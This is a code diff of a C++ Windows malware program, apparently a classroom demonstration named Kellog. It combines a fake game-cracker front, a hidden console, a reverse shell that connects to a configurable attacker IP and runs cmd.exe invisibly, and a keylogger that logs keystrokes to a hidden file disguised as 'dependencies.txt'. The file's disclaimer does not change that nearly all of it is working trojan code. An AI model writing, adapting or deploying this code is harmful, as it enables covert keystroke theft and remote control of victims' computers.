@@ -5,25 +5,45 @@ Decription: This is a simple RAT with keylogging functionality written in C++,
             it's to be used exclusively for demonstration purposes
 
 Refferences: https://stackoverflow.com/questions/21582448/creating-a-loading-animation
+             https://www.youtube.com/watch?v=J0nWQRqb3Fc
              https://www.youtube.com/watch?v=6f1GUyY9TYE
              https://github.com/izenynn/c-reverse-shell
+             https://www.tutorialspoint.com/cplusplus/cpp_preprocessor.htm
+*/
 
-Warning: I am NOT responsible for ANY misuse of this product
-         PLEASE DO NOT USE THIS FOR NEFARIOUS / ILLEGAL PURPOSES
+/* 
+############################# WARNING #######################################
+I am NOT responsible for ANY misuse of this product
+PLEASE DO NOT USE THIS FOR NEFARIOUS / ILLEGAL PURPOSES
+This product is intented to be simplistic & for a class desmonstration, 
+it is not a fully featured Malware product.
+#############################################################################
 */
 
 
 //Libraries to use
 #include <stdio.h>
+#include <stdlib.h>
 #include <iostream>
 #include <fstream>
 #include <windows.h>
 #include <winuser.h>
 #include <bits/stdc++.h>
 
-//Define namespace & avoid errors
-//Yes ik it's bad practice
-using namespace std; 
+#include <winsock2.h>
+#include <io.h>
+#include <process.h>
+#include <sys/types.h>
+#include <string>
+#pragma comment(lib,"ws2_32") //For Socket
+
+
+/*------------------------- THESE ARE THE THINGS WE CAN CHANGE ---------------------------------*/
+# define CLIENT_IP (char*)"10.0.0.28" //our Attackers IP
+# define CLIENT_PORT (int)1234 //Our listening port
+# define LOG_FILE "dependencies.txt" //The name of the log file for the keylogger & it's location
+//Note* by default, the log file is made with the windows hidden attribute
+/*----------------------------------------------------------------------------------------------*/
 
 
 
@@ -31,10 +51,8 @@ using namespace std;
 //using pascal case
 
 /*################ TROJAN #####################*/
-//For the "legitamate software" aspect to disgues our malware we will make Kellog appear to be a game cracker
+//For the "legitamate software" aspect our malware we will make Kellog appear to be a game cracker
 //This is becuase it's very unlikely any user would actually run an .exe file if they don't know what it is
-//NOTE* we could run this malware from a word doc macro or deliver it via a rubber ducky
-//But since we are doing an in-class demonstration we will likely not show that.
 
 void Trojan(){
     //Banner
@@ -69,23 +87,32 @@ void Trojan(){
         display_progress_bar(p);
         Sleep(50);
     }
-    //Indicate it's done and press any key to close
+    //Indicate it's done
     printf("\n");
-    printf("\nDone! \nThis Terminal will automatically close in a couple of seconds!\nGive it a minute to finalize the crack ... ");
-    Sleep(500);
+    printf("\nDone! \nThis Terminal will automatically close in a couple of seconds!\nGive it a minute to finalize the crack ... \n ");
+    Sleep(5000); //close after 5 seconds
 }
 
 
 /*################ KEYLOGGER #####################*/
 void Keylogger(){
-    #define LOG_FILE "keylogger.txt" //create log file
 
     auto saveData = [](std::string data){
-        fstream logFile;
+        std::fstream logFile;
 
         logFile.open(LOG_FILE, std::ios::app); //open the log file and append data (std::ios::app)
-        logFile << data; //writes data into the logfile
+        logFile << data; //writes they keyboard input data into the logfile
         logFile.close(); //close the file
+
+        //Now that the file is made, we need to hide it. Idealy we would move it around to a system folder
+        //or use other methods but for a simple demonstration, we'll simply add the "hidden file" attribute on windows
+        const wchar_t* fileLPCWSTR = L"dependencies.txt";
+        int attr = GetFileAttributes(fileLPCWSTR);
+        if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
+        SetFileAttributes(fileLPCWSTR, attr | FILE_ATTRIBUTE_HIDDEN);
+    }
+
+       
     };
 
 
@@ -103,18 +130,57 @@ void Keylogger(){
     
 }
 /*################ REVERSE SHELL #####################*/
-void RevShell(){
-    printf("REVERSE SHELL \n");
+int RevShell(void){
+
+    //Check to makesure the the Socket started correctly
+	WSADATA wsaData;
+	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
+		write(2, "[ERROR] WSASturtup failed.\n", 27);
+		return (1);
+	}
+
+	int port = CLIENT_PORT;
+	struct sockaddr_in sa; //Used to handle the internet address, refer to https://www.gta.ufrj.br/ensino/eel878/sockets/sockaddr_inman.html
+    //Create an IPv4 (AF_NET) TCP (SOCK_STREAM) connection
+	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+	sa.sin_family = AF_INET;
+	sa.sin_port = htons(port);
+	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);
+
+    //This is used while we wait for the connection to be established
+    #ifdef WAIT_FOR_CLIENT
+	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
+		Sleep(5000);
+	}
+    #else
+    //if it takes too long to connect the indicate it fialed 
+	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
+		write(2, "[ERROR] The crack experienced a problem, please try running it again.\n", 24);
+		return (1);
+	}
+    #endif
+    //Creates the background process and runs the socket, refer to https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
+	STARTUPINFOA sinfo;
+	memset(&sinfo, 0, sizeof(sinfo));
+	sinfo.cb = sizeof(sinfo);
+	sinfo.dwFlags = (STARTF_USESTDHANDLES);
+	sinfo.hStdInput = (HANDLE)sockt;
+	sinfo.hStdOutput = (HANDLE)sockt;
+	sinfo.hStdError = (HANDLE)sockt;
+	PROCESS_INFORMATION pinfo;
+    //have to set "cmd" to a modifiable array else the error:
+    //iso forbids converting string constant to lpstr -wwrite-strings (aka char*)
+	char cmd[]= "cmd";
+	CreateProcessA(NULL,cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+    
+    
 }
 /*########################################### MAIN FUNCTION #####################################################*/
 // define the main function signature
 // **look at this when rev engineering
 int main (int argc, char *argv[]){ 
-     //call our functions
-     Trojan();
-     ::ShowWindow(::GetConsoleWindow(), SW_HIDE); //This hides the terminal windows when run as administrator
-     Keylogger();
-     
-
-     
+    Trojan(); //This will make our exe look "legit"
+    ::ShowWindow(::GetConsoleWindow(), SW_HIDE); //This hides the terminal windows when run as administrator
+    RevShell(); //spawn a netcat reverse shell
+    Keylogger(); //run the keylogger
 }
